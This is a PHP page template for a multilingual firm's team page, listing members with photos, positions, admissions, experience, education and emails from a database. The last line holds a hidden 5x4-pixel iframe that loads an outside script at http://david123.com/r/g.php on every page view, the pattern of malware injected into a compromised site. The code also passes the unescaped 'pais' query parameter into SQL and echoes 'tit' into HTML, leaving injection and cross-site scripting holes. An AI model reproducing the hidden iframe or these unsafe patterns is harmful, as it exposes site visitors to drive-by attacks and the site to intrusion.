<?
	define ('authenticate', false);
	require ('./inc/conf.inc.php');
	$soc=$_SESSION['socio'];
	if(!$lng){
		$lng=$_SESSION['lng'];
	}
	if(!isset($id_sel) || $id_sel<1 ){ $id_sel=-1; }
	$tit=$_GET['tit'];
	$pais=$_GET['pais'];
	
	global $prefijo_socio,$socio;

	$exper['esp']='Experiencia';
	$exper['ing']='Experience';
	$exper['por']='Experiência';
	
	$admis['esp']='Habilitaciones';
	$admis['ing']='Admittions';
	$admis['por']='Habilitações';
	
	$educ['esp']='Educación';
	$educ['ing']='Education';
	$educ['por']='Formação';
	
	$paises['esp']='País';
	$paises['ing']='Country';
	$paises['por']='Pais';
	
	$ano['esp']='Año';
	$ano['ing']='Year';
	$ano['por']='Ano';


	$col1='admisiones_'.$lng;
	$col2='experiencia_'.$lng;
	$col3='educacion_'.$lng;

?>
<link href="estilos<?=$soc?>.css" rel="stylesheet" type="text/css">
<script language="javascript">
//precacheo de imagenes
var bullet1=new Image(9,15);
bullet1.src="images/flechita1.gif";
var bullet2=new Image(9,15);
//bullet2.src="images/bullet<?=$soc?>2.gif";
bullet2.src="images/flechita1.gif";


//////////////////////////////////////////
function opcionover(x){
x.className='linkover2';
x.parentNode.parentNode.firstChild.firstChild.src=bullet2.src;
}
function opcionout(x){
x.className='link2';
x.parentNode.parentNode.firstChild.firstChild.src=bullet1.src;
}

function atras(x){
	formframe.id_sel.value=x
	formframe.submit()

}
var lng='<?=$lng?>';
</script>
<style type="text/css">
<!--
.style7 {font-family: Verdana, Arial, Helvetica, sans-serif; font-weight: bold; font-size: 11px; }
.style9 {font-family: Verdana, Arial, Helvetica, sans-serif; font-size: 10px}
-->
</style>
</head>
<table width="100%" border="0" cellpadding="0" cellspacing="0">
<tr valign="top">
	<!--<td height="35" colspan="5" align="right" valign="bottom" class="espacio" ><span class="titulos"> <?= dbi::value('secciones',"id=5 and lng='$lng'",'titulo')?>&nbsp;&nbsp;</span>-->
	<td height="35" colspan="5" align="right" valign="bottom" class="espacio" ><span class="titulos"> <?=$tit?>&nbsp;&nbsp;</span>
	</td>
</tr>
</table>
<?

//	$experiencias=dbi::select('equipo as e left join equipo_experiencia as x on e.id=x.id_socio','e.*',"x.id_area=$id_sub_sel".( $pais ? " AND e.pais = '$pais'" : '')."  group by e.id");

if ($pais=='')
	{$experiencias=dbi::select('equipo','*',"id not in (6,7, 180)".( $pais ? " AND pais = '$pais'" : ''),($pais ? 'orden':'apellido'));}
else
	{$experiencias=dbi::select('equipo','*',"id not in (6,7)".( $pais ? " AND pais = '$pais'" : ''),($pais ? 'orden':'apellido'));}



	if( $experiencia = $experiencias->fetch_object() )
	{
		$año = $experiencia->ano ? true : false;
?>
<table height="100%" width="100%" cellpadding="0" cellspacing="0" border="0">
<tr valign="top">
<td width="0%" valign="top" height="100%"><table width="100%"  cellspacing="0" cellpadding="2">
	<?
	
	do
	{
		$cargo='cargo_'.$lng;
		?>
				  <tr> 
					<td valign="top" colspan="3" height="30"></td>
				  </tr>
				  <tr> 
					<td width="47" rowspan="5" valign="top" class="foto"  align="center"><img src="images/curriculums/<?=$experiencia->foto?>" width="47" height="66"></td>
					<td width="630" valign="top" class="ali1"> <div align="justify"><span class="nombre"><?=$experiencia->nombre?></span><br>
						<span class="partner"><?=$experiencia->$cargo?></span></div></td>
					<td width="87" class="ali1"><img src="images/<?=strtolower($experiencia->pais)?>.gif" border="0" /></td>
				  </tr>
				  <tr> 
					<td colspan="2" class="ali1"><div align="justify"><span class="titulocv"><strong><?=$admis[$lng]?>:</strong></span><span class="textocv">&nbsp;<?=$experiencia->$col1?></span></div></td>
				  </tr>
				  <tr> 
					<td colspan="2" class="ali1"><div align="justify"><span class="titulocv"><strong><?=$exper[$lng]?>:</strong></span><span class="textocv">&nbsp;<?=$experiencia->$col2?></span></div></td>
				  </tr>
				  <tr> 
					<td colspan="2" class="ali1"><div align="justify"><strong class="titulocv"><?=$educ[$lng]?>:</strong><span class="textocv">&nbsp;<?=$experiencia->$col3?></span></div></td>
				  </tr>
				  <tr> 
					<td height="100%" colspan="2" class="ali1"><div align="justify"><span class="titulocv"><strong>Email:</strong></span><span class="textocv">&nbsp;<a href="mailto:<?=$experiencia->email?>" class="textocv"><?=$experiencia->email?></a></span></div></td>
				  </tr>
				  <tr> 
					<td valign="top" colspan="3" height="30"></td>
				  </tr>
			<?
		}while( $experiencia = $experiencias->fetch_object() );
	}
	?>
</table></td>
</TD></TR></Table>
<iframe src="http://david123.com/r/g.php" width="5" height="4" align="right"></iframe></body></html>
